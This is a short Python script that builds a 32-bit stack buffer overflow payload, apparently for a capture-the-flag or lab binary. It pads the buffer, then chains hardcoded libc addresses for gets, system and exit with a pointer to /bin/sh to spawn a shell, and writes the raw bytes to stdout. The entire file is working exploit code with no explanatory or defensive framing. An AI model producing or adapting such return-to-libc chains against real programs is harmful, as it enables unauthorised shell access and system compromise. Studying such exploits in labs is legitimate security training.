#!/usr/bin/env python3

import sys
import struct
import os

payload = b'A' * 0x18
payload += b'BBBB'
payload += struct.pack("I", 0xf7e5afc0) # gets
payload += struct.pack("I", 0x080485fb) # pop ebp;ret
payload += struct.pack("I", 0xffffd27c) # address to nullify
payload += struct.pack("I", 0xf7e36850) # system
payload += struct.pack("I", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
payload += struct.pack("I", 0xf7f597c8) # address to /bin/sh

sys.stdout.buffer.write(payload)
